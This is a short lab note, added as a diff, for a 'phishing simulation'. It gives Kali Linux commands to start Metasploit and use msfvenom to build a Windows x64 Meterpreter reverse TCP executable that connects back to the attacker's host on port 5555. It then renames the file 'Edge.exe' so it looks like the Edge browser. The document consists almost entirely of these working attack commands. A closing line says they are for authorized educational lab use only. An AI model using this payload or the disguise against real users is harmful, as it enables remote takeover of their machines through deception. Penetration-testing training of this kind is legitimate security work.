@@ -1,0 +1,26 @@
+Metasploit Reverse TCP Payload and Phishing Simulation Lab
+Network Identification and Payload Commands
+
+Run on ZYKALI01 (Kali Linux):
+
+ip a
+
+Start Metasploit:
+
+sudo msfconsole
+
+Generate the Windows x64 Meterpreter reverse TCP executable:
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  --platform windows \
+  -a x64 \
+  LHOST=<ZYKALI01-IP-ADDRESS> \
+  LPORT=5555 \
+  -f exe \
+  -o /home/kali/payload.exe
+
+Copy and rename the payload:
+
+cp /home/kali/payload.exe /home/kali/Edge.exe
+
+Authorized educational lab use only.
